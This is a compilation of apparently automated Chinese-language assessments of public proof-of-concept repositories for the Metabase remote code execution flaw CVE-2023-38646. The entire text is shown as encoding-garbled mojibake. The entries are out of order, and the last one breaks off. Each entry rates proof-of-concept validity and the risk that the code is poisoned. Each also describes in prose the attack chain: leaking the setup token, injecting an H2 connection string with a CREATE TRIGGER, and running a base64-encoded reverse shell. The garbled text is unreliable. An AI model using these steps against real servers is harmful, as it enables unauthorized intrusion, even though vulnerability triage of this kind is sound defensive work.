2.  **åˆ©ç”¨Setup Tokenæ‰§è¡Œå‘½ä»¤ï¼š** ç¬¬äºŒä¸ªPOCè„šæœ¬ï¼ˆ`CVE-2023-38646-Reverse-Shell.py`ï¼‰åˆ©ç”¨è·å–åˆ°çš„Setup Tokenï¼Œå‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®ã€‚è¯¥é…ç½®ä½¿ç”¨H2æ•°æ®åº“å¼•æ“ï¼Œå¹¶åœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­æ³¨å…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨`pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨`INFORMATION_SCHEMA.TABLES`è¡¨ä¸Šæ‰§è¡Œ`SELECT`æ“ä½œä¹‹å‰è§¦å‘ï¼Œä»è€Œæ‰§è¡ŒBase64ç¼–ç çš„payloadï¼Œpayloadè§£ç åæ‰§è¡Œåå‘shellå‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š**

ä»æä¾›çš„æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’ŒPOCä»£ç æ¥çœ‹ï¼Œè¯¥æ¼æ´åˆ©ç”¨æ˜¯æœ‰æ•ˆçš„ã€‚æœç´¢ç»“æœä¸­åŒ…å«äº†å¤šä¸ªå…³äºæ­¤æ¼æ´çš„æè¿°ã€åˆ©ç”¨æ–¹æ³•ä»¥åŠPOCä»£ç çš„é“¾æ¥ã€‚

**æŠ•æ¯’é£é™©ï¼š**

*   ç¬¬ä¸€ä¸ªè„šæœ¬`CVE-2023-38646-POC.py`åªæ˜¯ç”¨æ¥è·å–setup tokenï¼Œæœ¬èº«ä¸åŒ…å«ä»»ä½•æ¶æ„ä»£ç ã€‚
*   ç¬¬äºŒä¸ªè„šæœ¬`CVE-2023-38646-Reverse-Shell.py`åŒ…å«åå‘shellçš„payloadï¼Œè¿™éƒ¨åˆ†æ˜¯æ¼æ´åˆ©ç”¨çš„å¿…è¦ç»„æˆï¼Œä¸èƒ½ç®—ä½œæŠ•æ¯’ä»£ç ã€‚å¯èƒ½çš„æŠ•æ¯’é£é™©åœ¨äºï¼š
    *   **Payloadæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼š** è™½ç„¶å½“å‰Payloadæ˜¯åå‘shellï¼Œä½†æ”»å‡»è€…å¯èƒ½ä¿®æ”¹Payloadï¼Œæ¤å…¥å…¶ä»–æ¶æ„è¡Œä¸ºï¼Œæ¯”å¦‚æ•°æ®çªƒå–ã€å‹’ç´¢è½¯ä»¶ç­‰ã€‚
    *   **ä¾èµ–é¡¹é£é™©ï¼š** è„šæœ¬ä¾èµ–requestsåº“ï¼Œå¦‚æœrequestsåº“æœ¬èº«è¢«æŠ•æ¯’ï¼Œå¯èƒ½å¼•å…¥å®‰å…¨é£é™©ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚è¿™ä¸ª10%ä¸»è¦æ¥è‡ªè„šæœ¬æœ¬èº«ï¼Œæ¯”å¦‚åå‘shell çš„IPåœ°å€ã€ç«¯å£è¢«æ›¿æ¢æˆæ”»å‡»è€…æ§åˆ¶çš„è‚‰é¸¡ä»è€Œè¿›è¡Œè·³æ¿æ”»å‡»ï¼Œä»¥åŠå®‰è£…æ¶æ„ä¾èµ–é¡¹çš„å¯èƒ½ã€‚

æ€»ä¹‹ï¼Œè¯¥æ¼æ´çš„åˆ©ç”¨æ–¹å¼æ˜¯åˆ©ç”¨æœªæˆæƒçš„setupæ¥å£ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„çš„æ•°æ®åº“è¿æ¥é…ç½®æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**é¡¹ç›®åœ°å€:** [securezeron/CVE-2023-38646](https://github.com/securezeron/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #26

**æ¥æº**: [CVE-2023-38646-threatHNTR_CVE-2023-38646.md](../2023/CVE-2023-38646-threatHNTR_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€èº«ä»½éªŒè¯å³å¯è¿œç¨‹æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 å’Œ Metabase Enterprise < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹æœªæ‰“è¡¥ä¸ä¸”ç½‘ç»œå¯è¾¾ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šä»¥æœåŠ¡å™¨æƒé™çº§åˆ«æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„ PoC ä»£ç çœ‹èµ·æ¥æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† Metabase å®‰è£…è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå³åœ¨è®¾ç½®è¿‡ç¨‹ä¸­å¯ä»¥æŒ‡å®šæ•°æ®åº“è¿æ¥ï¼Œå¹¶ä¸”æœªå¯¹æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²è¿›è¡Œå……åˆ†çš„éªŒè¯ã€‚é€šè¿‡æ„é€ æ¶æ„çš„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„ä»£ç ã€‚

*   è¯¥PoCé¦–å…ˆè·å– `setup-token` å’Œ Metabase ç‰ˆæœ¬ä¿¡æ¯ã€‚
*   ç„¶åï¼Œå¯¹åŒ…å«åå‘shellå‘½ä»¤çš„payloadè¿›è¡Œbase64ç¼–ç ã€‚
*   æ¥ç€ï¼Œå®ƒæ„é€ ä¸€ä¸ªåŒ…å«æ¶æ„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„JSON payloadï¼Œè¯¥å­—ç¬¦ä¸²åˆ©ç”¨äº†`CREATE TRIGGER` è¯­å¥å’Œå†…åµŒçš„JavaScriptä»£ç æ¥æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤ã€‚
*   æœ€åï¼Œå®ƒå°†æ­¤payloadå‘é€åˆ°`/api/setup/validate`ç«¯ç‚¹ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œï¼Œåå¼¹shellåˆ°æ”»å‡»è€…æ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚

å‚è€ƒæœç´¢ç»“æœ [7] æä¾›äº† GitHub é“¾æ¥ï¼Œè¿›ä¸€æ­¥è¯å®äº† PoC çš„å­˜åœ¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

è™½ç„¶PoCæœ¬èº«çš„ç›®çš„æ˜¯åˆ©ç”¨æ¼æ´ï¼Œä½†å­˜åœ¨ä¸€å®šç¨‹åº¦çš„æŠ•æ¯’é£é™©ã€‚PoCä»£ç ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå¼¹shellçš„IPåœ°å€å’Œç«¯å£ã€‚å¦‚æœæ”»å‡»è€…æ¶æ„ä¿®æ”¹PoCä»£ç ï¼Œä¾‹å¦‚æ·»åŠ é¢å¤–çš„åé—¨æˆ–æ¶æ„åŠŸèƒ½ï¼Œå¹¶å°†å…¶ä¼ æ’­ç»™å…¶ä»–ç”¨æˆ·ï¼Œåˆ™å¯èƒ½å¯¼è‡´æ›´å¤§èŒƒå›´çš„æ”»å‡»ã€‚é£é™©ä¸»è¦ä½“ç°åœ¨ä»¥ä¸‹å‡ ä¸ªæ–¹é¢ï¼š

*   **ä¾èµ–ç¬¬ä¸‰æ–¹åº“:** æ£€æŸ¥ PoC ä»£ç ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“æ˜¯å¦å­˜åœ¨æ¶æ„ä»£ç ã€‚
*   **Payloadä¿®æ”¹:** ç”¨æˆ·å¯èƒ½ç›´æ¥ä½¿ç”¨ PoC ä»£ç ï¼Œè€Œä¸æ£€æŸ¥å…¶å†…å®¹ã€‚æ”»å‡»è€…å¯èƒ½ä¿®æ”¹ payloadï¼Œä¾‹å¦‚æ¤å…¥æŒ–çŸ¿ç¨‹åºæˆ–è€…å…¶ä»–æ¶æ„è½¯ä»¶ã€‚
*   **ç¤¾åŒºä¼ æ’­:** ä¿®æ”¹åçš„ PoC ä»£ç å¯èƒ½åœ¨å®‰å…¨ç¤¾åŒºä¸­ä¼ æ’­ï¼Œå¯¼è‡´æ›´å¤šç”¨æˆ·å—åˆ°å½±å“ã€‚

ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©å¤§çº¦ä¸º 10%ã€‚è¿™ä¸ªç™¾åˆ†æ¯”å¹¶ä¸é«˜ï¼Œå› ä¸ºå¤§å¤šæ•°å®‰å…¨ç ”ç©¶äººå‘˜ä¼šæ£€æŸ¥ä»£ç åå†ä½¿ç”¨ï¼Œä½†ä»ç„¶éœ€è¦è­¦æƒ•ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å–Setup Token:**  åˆ©ç”¨ `/api/session/properties` ç«¯ç‚¹è·å– Metabase å®ä¾‹çš„ setup tokenã€‚
2.  **æ„é€ æ¶æ„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²:**  åˆ›å»ºä¸€ä¸ªåŒ…å«æ¶æ„ H2 æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²çš„ JSON payloadã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œé€šè¿‡`CREATE TRIGGER`æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚
3.  **å‘é€è¯·æ±‚:**  å°†æ„é€ çš„ JSON payload å‘é€åˆ° `/api/setup/validate` ç«¯ç‚¹ã€‚
4.  **åå¼¹Shell:**  å¦‚æœæ¼æ´åˆ©ç”¨æˆåŠŸï¼Œç›®æ ‡ Metabase æœåŠ¡å™¨å°†åå¼¹ shell åˆ°æ”»å‡»è€…æŒ‡å®šçš„ IP åœ°å€å’Œç«¯å£ã€‚
5.  **åˆ©ç”¨æœç´¢ç»“æœ** æœç´¢ç»“æœä¸­æåŠè¯¥æ¼æ´å¯èƒ½è¢«åˆ©ç”¨ (Web Attack: Metabase RCE Vulnerability CVE-2023-38646)ï¼Œå¹¶æä¾›äº†ç¼“è§£æªæ–½ï¼Œè¡¨æ˜è¯¥æ¼æ´åœ¨é‡å¤–å¯èƒ½è¢«åˆ©ç”¨ã€‚

**ç¼“è§£æªæ–½ï¼š**

*   å°† Metabase å‡çº§åˆ°å—å½±å“ç‰ˆæœ¬ä»¥å¤–çš„ç‰ˆæœ¬ (>= 0.46.6.1 æˆ– >= 1.46.6.1)æˆ–å…¶ä»–ä¿®å¤ç‰ˆæœ¬ (0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, å’Œ 1.43.7.2)ã€‚


**é¡¹ç›®åœ°å€:** [threatHNTR/CVE-2023-38646](https://github.com/threatHNTR/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #27

**æ¥æº**: [CVE-2023-38646-yxl2001_CVE-2023-38646.md](../2023/CVE-2023-38646-yxl2001_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæ— éœ€è®¤è¯å³å¯è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 and < 1.46.6.1

**åˆ©ç”¨æ¡ä»¶:** MetabaseæœåŠ¡å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646 æ¼æ´å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è¯¥æ¼æ´å­˜åœ¨äº Metabase å¼€æºç‰ˆæœ¬ 0.46.6.1 ä¹‹å‰å’Œ Metabase ä¼ä¸šç‰ˆæœ¬ 1.46.6.1 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **è·å– Setup Token:** é¦–å…ˆï¼Œåˆ©ç”¨`CVE-2023-38646-POC.py`è„šæœ¬ï¼Œé€šè¿‡è®¿é—®`/api/session/properties`æ¥å£æ¥è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚æ­¤æ­¥éª¤ç”¨äºåˆ¤æ–­ç›®æ ‡æ˜¯å¦å­˜åœ¨æ¼æ´ï¼Œä»¥åŠè·å–åç»­åˆ©ç”¨æ‰€éœ€çš„tokenã€‚
2.  **æ„é€ æ¶æ„è¯·æ±‚:**  ä½¿ç”¨`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬ï¼Œè¯¥è„šæœ¬åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ä¸­åµŒå…¥æ¶æ„ä»£ç ã€‚å…·ä½“æ¥è¯´ï¼Œå®ƒåˆ›å»ºäº†ä¸€ä¸ªè§¦å‘å™¨ `pwnshell`ï¼Œè¯¥è§¦å‘å™¨åœ¨è®¿é—® `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œï¼Œä»è€Œè§¦å‘ `java.lang.Runtime.getRuntime().exec()` æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚è„šæœ¬å°†åå¼¹shellçš„bashå‘½ä»¤è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åå°†å…¶æ³¨å…¥åˆ°è§¦å‘å™¨ä¸­ã€‚
3.  **å‘é€ POST è¯·æ±‚:** å°†æ„é€ å¥½çš„åŒ…å«æ¶æ„ä»£ç çš„ JSON æ•°æ®é€šè¿‡ POST è¯·æ±‚å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚æ­¤è¯·æ±‚ä½¿ç”¨è·å–çš„ `setup-token` è¿›è¡ŒéªŒè¯ï¼Œå¹¶è§¦å‘ H2 æ•°æ®åº“è¿æ¥ï¼Œä»è€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„ä»£ç ã€‚

**æœ‰æ•ˆæ€§ï¼š**

æ ¹æ®æ¼æ´ä¿¡æ¯å’Œæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´çš„ POC ä»£ç æœ‰æ•ˆã€‚æœç´¢å¼•æ“ç»“æœä¹Ÿè¡¨æ˜å­˜åœ¨å…¬å¼€çš„ POC å¹¶ä¸”è¯¥æ¼æ´å·²è¢«ç§¯æåˆ©ç”¨ã€‚

**æŠ•æ¯’é£é™©ï¼š**

`CVE-2023-38646-POC.py` è„šæœ¬åªæ˜¯ç”¨äºè·å– setup tokenï¼Œç›¸å¯¹å®‰å…¨ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ã€‚
`CVE-2023-38646-Reverse-Shell.py`è„šæœ¬æœ¬èº«å®ç°äº†æ¼æ´åˆ©ç”¨ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æ˜¯å®ç°åå¼¹ shellã€‚ ä»£ç ä¸­å¯¹bashå‘½ä»¤è¿›è¡Œäº†base64ç¼–ç ,ä¸€å®šç¨‹åº¦ä¸Šå¢åŠ äº†ä»£ç é˜…è¯»çš„éš¾åº¦ã€‚å­˜åœ¨ä¸€å®šé£é™©ï¼š
    * ç¼–ç å¯èƒ½å­˜åœ¨æ¤å…¥åé—¨çš„é£é™©ï¼Œä¾‹å¦‚æ’å…¥é¢å¤–çš„å‘½ä»¤æˆ–ä¿®æ”¹åå¼¹ shell çš„è¡Œä¸ºã€‚å°½ç®¡ç›®å‰ä»£ç çœ‹ä¸Šå»æ˜¯å®ç°æ­£å¸¸çš„åå¼¹shellï¼Œä½†å­˜åœ¨è¢«ç¯¡æ”¹çš„å¯èƒ½æ€§ã€‚ä¾‹å¦‚ï¼Œåœ¨base64ç¼–ç å‰ååŠ å…¥æ¶æ„æŒ‡ä»¤ã€‚
    * è¯¥è„šæœ¬ä¾èµ–äºç›®æ ‡ç³»ç»Ÿä¸Šå­˜åœ¨ bash å’Œ base64 å‘½ä»¤ã€‚è™½ç„¶å¤§å¤šæ•° Linux ç³»ç»Ÿéƒ½åŒ…å«è¿™äº›å‘½ä»¤ï¼Œä½†åœ¨æŸäº›å—é™ç¯å¢ƒä¸­å¯èƒ½ä¸å­˜åœ¨ã€‚ä½œè€…æ¸…æ¥šè¿™ä¸€ç‚¹,ä½†å¹¶æœªå¯¹è¿™ç§æƒ…å†µè¿›è¡Œå¤„ç†,å®¹æ˜“é€ æˆè¯¯åˆ¤.
ç»¼åˆæ¥çœ‹ï¼ŒæŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦çš„é£é™©é›†ä¸­åœ¨base64ç¼–ç å†…å®¹å¯èƒ½å­˜åœ¨è¢«ä¿®æ”¹æˆ–æ¤å…¥åé—¨çš„é£é™©ã€‚

**é¡¹ç›®åœ°å€:** [yxl2001/CVE-2023-38646](https://github.com/yxl2001/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---



---

## POC #17

**æ¥æº**: [CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md](../2023/CVE-2023-38646-alexandre-pecorilla_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ), < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** Metabaseå®ä¾‹å¯¹å¤–å¼€æ”¾ï¼Œä¸”ç‰ˆæœ¬ä½äºå®‰å…¨ç‰ˆæœ¬ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 0%

## è¯¦æƒ…

CVE-2023-38646 å…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨ Metabase æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯ã€æœç´¢ç»“æœä»¥åŠæä¾›çš„æ¼æ´åˆ©ç”¨ä»£ç ï¼Œå¯ä»¥åšå‡ºä»¥ä¸‹åˆ¤æ–­ï¼š

**æœ‰æ•ˆæ€§ï¼š**
æä¾›çš„POCä»£ç æœ‰æ•ˆã€‚ä»£ç åˆ©ç”¨äº† Metabase åœ¨è®¾ç½®è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€šè¿‡æ„é€ æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æŠ•æ¯’é£é™©ï¼š**
æŸ¥çœ‹æä¾›çš„POCä»£ç ï¼Œå¹¶æœªå‘ç°æ˜æ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥POCè„šæœ¬çš„åŠŸèƒ½æ˜¯åˆ©ç”¨æ¼æ´æ‰§è¡Œåå¼¹shellï¼Œå°†ç›®æ ‡æœºå™¨çš„shellåå¼¹åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPå’Œç«¯å£ã€‚ä¸»è¦é€»è¾‘éƒ½åœ¨æ„é€ payloadä¸Šï¼Œæ²¡æœ‰å‘ç°ä½œè€…éšè—çš„æ¶æ„ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**
1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦è·å– Metabase å®ä¾‹çš„ `setup-token`ã€‚è¿™ä¸ªtokenå¯ä»¥é€šè¿‡è®¿é—® `/api/session/properties` æ¥å£è·å¾—ï¼Œè¯¥æ¥å£æ— éœ€èº«ä»½éªŒè¯ã€‚
2.  æ”»å‡»è€…æ„é€ ä¸€ä¸ªæ¶æ„çš„ `payload`ï¼Œå…¶ä¸­åŒ…å«æ¶æ„çš„æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ã€‚è¯¥å­—ç¬¦ä¸²åˆ©ç”¨ H2 æ•°æ®åº“çš„ç‰¹æ€§ï¼Œåœ¨è¿æ¥æ—¶æ‰§è¡Œä»»æ„ Java ä»£ç ã€‚
3.  æ”»å‡»è€…å°†æ„é€ çš„ `payload` å‘é€åˆ° `/api/setup/validate` æ¥å£ã€‚
4.  Metabase å°è¯•è¿æ¥æ¶æ„æ•°æ®åº“ï¼Œä»è€Œè§¦å‘æ¼æ´ï¼Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ï¼Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚å…·ä½“æ˜¯é€šè¿‡åˆ›å»ºä¸€ä¸ªè§¦å‘å™¨ï¼Œåœ¨æŸ¥è¯¢ `INFORMATION_SCHEMA.TABLES` è¡¨ä¹‹å‰æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç ï¼Œè¿™æ®µä»£ç ä¼šè°ƒç”¨ `java.lang.Runtime.getRuntime().exec()` æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚
5.  POCä»£ç ä¸­ï¼Œåˆ©ç”¨ `bash -c` å’Œ `base64` å‘½ä»¤ç»„åˆï¼Œæ‰§è¡Œ base64 ç¼–ç åçš„åå¼¹ shell å‘½ä»¤ï¼Œå®ç°åå¼¹ shellã€‚

**é¡¹ç›®åœ°å€:** [alexandre-pecorilla/CVE-2023-38646](https://github.com/alexandre-pecorilla/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #18

**æ¥æº**: [CVE-2023-38646-asepsaepdin_CVE-2023-38646.md](../2023/CVE-2023-38646-asepsaepdin_CVE-2023-38646.md)

## CVE-2023-38646-Metabase-RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** Metabase

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** < 0.46.6.1 (å¼€æºç‰ˆ) å’Œ < 1.46.6.1 (ä¼ä¸šç‰ˆ)

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡Metabaseå®ä¾‹ç‰ˆæœ¬ä½äºå—å½±å“ç‰ˆæœ¬ï¼Œä¸”å¯ä»¥é€šè¿‡HTTP/HTTPSè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£é™©:** 10%

## è¯¦æƒ…

CVE-2023-38646æ˜¯Metabaseä¸­çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ ¹æ®æ¼æ´åº“ä¿¡æ¯å’Œæœç´¢å¼•æ“ç»“æœï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´åœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚æ¼æ´åˆ©ç”¨ä»£ç `CVE-2023-38646-POC.py`å’Œ`CVE-2023-38646-Reverse-Shell.py`æä¾›äº†ä¸¤ç§åˆ©ç”¨æ–¹å¼ï¼š

1.  **æ¼æ´åˆ©ç”¨æ–¹å¼ï¼š**
    *   **è·å–Setup Tokenï¼š** é¦–å…ˆï¼Œ`CVE-2023-38646-POC.py` è„šæœ¬é€šè¿‡è®¿é—®`/api/session/properties`ç«¯ç‚¹æ¥è·å–Metabaseå®ä¾‹çš„Setup Tokenã€‚è¯¥Tokenåœ¨åˆå§‹åŒ–è®¾ç½®é˜¶æ®µä½¿ç”¨ï¼Œæ˜¯åç»­åˆ©ç”¨çš„å…³é”®ã€‚
    *   **Reverse Shellåˆ©ç”¨ï¼š** `CVE-2023-38646-Reverse-Shell.py` è„šæœ¬åˆ©ç”¨è·å–çš„Setup Tokenï¼Œé€šè¿‡å‘`/api/setup/validate`ç«¯ç‚¹å‘é€POSTè¯·æ±‚ï¼Œå¹¶æ„é€ æ¶æ„çš„H2æ•°æ®åº“è¿æ¥å­—ç¬¦ä¸²ï¼Œå°†Payloadæ³¨å…¥åˆ°æ•°æ®åº“é…ç½®ä¸­ã€‚è¯¥Payloadä¼šæ‰§è¡Œä¸€ä¸ªåå‘Shellå‘½ä»¤ï¼Œè¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„IPåœ°å€å’Œç«¯å£ï¼Œä»è€Œå®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚

2.  **æœ‰æ•ˆæ€§ï¼š**
    æ ¹æ®æ¼æ´ä¿¡æ¯ã€æœç´¢ç»“æœå’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤æ–­æ­¤POC**æœ‰æ•ˆ**ã€‚å¤šä¸ªæ¥æºè¯å®äº†è¯¥æ¼æ´çš„å­˜åœ¨å’Œå¯åˆ©ç”¨æ€§ï¼Œå¹¶ä¸”æä¾›äº†å¯æ“ä½œçš„POCã€‚

3.  **æŠ•æ¯’é£é™©ï¼š**
    ä»£ç ä¸­å‘ç°çš„æ½œåœ¨æŠ•æ¯’é£é™©è¾ƒä½ï¼Œçº¦ä¸º10%ã€‚ä¸»è¦åˆ†æå¦‚ä¸‹ï¼š
    *   `CVE-2023-38646-POC.py` ä¸»è¦ç”¨äºè·å–Setup Tokenï¼ŒåŠŸèƒ½æ¯”è¾ƒç®€å•ï¼Œæ²¡æœ‰æ˜æ˜¾çš„æ¶æ„è¡Œä¸ºã€‚
    *   `CVE-2023-38646-Reverse-Shell.py` çš„ä¸»è¦åŠŸèƒ½æ˜¯åˆ©ç”¨Setup Tokenæ‰§è¡ŒRCEï¼Œä½†æ˜¯æ”»å‡»è€…å¯ä»¥è‡ªå®šä¹‰åå‘è¿æ¥çš„IPå’Œç«¯å£ï¼Œå› æ­¤ä»£ç æœ¬èº«åªæ˜¯æä¾›äº†ä¸€ä¸ªæ¡†æ¶ã€‚é£é™©ç‚¹åœ¨äºå¦‚æœæ”»å‡»è€…ä¸å°å¿ƒä½¿ç”¨äº†é”™è¯¯çš„payloadï¼Œå¯èƒ½å¯¼è‡´ç›®æ ‡ç³»ç»Ÿå´©æºƒæˆ–å…¶ä»–å¼‚å¸¸ã€‚

   æ€»ä½“æ¥è¯´ï¼Œé£é™©ä¸»è¦é›†ä¸­åœ¨payloadçš„æ„å»ºå’Œæ‰§è¡Œä¸Šï¼Œè€Œéä»£ç æœ¬èº«å­˜åœ¨æ¶æ„æ³¨å…¥ã€‚ä½†ä¾æ—§éœ€è¦å¯¹ä¸‹è½½çš„è„šæœ¬è¿›è¡Œå…¨é¢çš„ä»£ç å®¡è®¡ã€‚


**é¡¹ç›®åœ°å€:** [asepsaepdin/CVE-2023-38646](https://github.com/asepsaepdin/CVE-2023-38646)

**æ¼æ´è¯¦æƒ…:** [CVE-2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646)

---

## POC #19

**æ¥æº**: [CVE-2023-38646-birdm4nw_CVE-2023-38646.md](../2023/CVE-2023-38646-birdm4nw_CVE-2023-38646.md)

## CVE-2023-38646 - Metabase RCE

**æ¼æ´ç¼–å·:** CVE-2023-38646

**æ¼æ´ç±»å‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

